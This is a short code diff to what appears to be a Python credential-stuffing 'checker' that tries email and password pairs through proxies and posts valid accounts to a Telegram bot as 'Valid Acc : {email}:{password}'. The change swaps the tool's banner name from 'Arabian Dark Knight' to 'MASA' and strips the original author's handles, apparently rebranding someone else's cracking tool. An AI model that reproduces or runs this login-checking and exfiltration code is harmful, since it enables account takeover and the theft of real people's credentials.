@@ -7,7 +7,7 @@ from concurrent.futures import ThreadPoolExecutor
 import os
 
 
-logo = pyfiglet.figlet_format('Arabian Dark Knight')
+logo = pyfiglet.figlet_format('MASA')
 print(logo)
 
 mail = MailHub()
@@ -43,8 +43,6 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file, counters):
 
 def send_to_telegram(email, password):
     message = f"""
-Arabian Dark Knight - @ArabianDarkKnight - @DarkKnightArabian
-
 Valid Acc : {email}:{password}
     """
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -106,3 +104,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
